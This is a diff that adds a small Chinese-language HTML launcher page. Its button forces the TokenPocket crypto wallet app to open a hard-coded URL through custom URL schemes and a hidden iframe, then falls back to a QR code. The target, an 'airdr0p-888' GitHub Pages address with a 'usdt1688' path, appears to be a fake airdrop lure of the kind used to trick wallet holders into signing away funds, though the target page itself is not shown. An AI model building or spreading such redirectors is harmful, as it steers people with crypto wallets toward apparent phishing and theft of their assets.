@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>打开 TP 钱包</title>
+</head>
+<body>
+
+<button onclick="openTPWallet()">在 TP 钱包中打开 DApp</button>
+
+<!-- 二维码容器（可选） -->
+<div id="qrcode" style="margin-top: 20px; display: none;">
+  <p>请使用 TP 钱包扫码打开：</p>
+  <img id="qrcode-img" src="" alt="二维码">
+</div>
+
+<script>
+// ===== 配置目标链接 =====
+const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
+
+// ===== 检测是否在 TP 浏览器中 =====
+function isTPBrowser() {
+  const ua = navigator.userAgent.toLowerCase();
+  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
+}
+
+// ===== 显示二维码 =====
+function showQRCode(url) {
+  const qr = document.getElementById('qrcode');
+  const img = document.getElementById('qrcode-img');
+  if (!qr || !img) return;
+
+  // 使用二维码生成 API（推荐：https://goqr.me/api/）
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+  qr.style.display = 'block';
+}
+
+// ===== 主函数：尝试唤醒 TP 钱包 =====
+function openTPWallet() {
+  const encoded = encodeURIComponent(TARGET_URL);
+  const schemes = [
+    `tpdapp://open?url=${encoded}`,  // 主方案
+    `tp://dapp?url=${encoded}`       // 备用方案
+  ];
+
+  // 如果已在 TP 浏览器中，直接跳转网页
+  if (isTPBrowser()) {
+    location.href = TARGET_URL;
+    return;
+  }
+
+  // 1. 直接跳转主 scheme
+  window.location.href = schemes[0];
+
+  // 2. 300ms 后用 iframe 增强唤醒（iOS 兼容）
+  setTimeout(() => {
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = schemes[0];
+      document.body.appendChild(iframe);
+      setTimeout(() => document.body.removeChild(iframe), 2000);
+    } catch (e) {}
+  }, 300);
+
+  // 3. 2秒后尝试备用 scheme
+  setTimeout(() => {
+    window.location.href = schemes[1];
+  }, 2000);
+
+  // 4. 3.5秒后显示二维码（兜底）
+  setTimeout(() => {
+    showQRCode(TARGET_URL);
+  }, 3500);
+}
+</script>
+
+</body>
+</html>
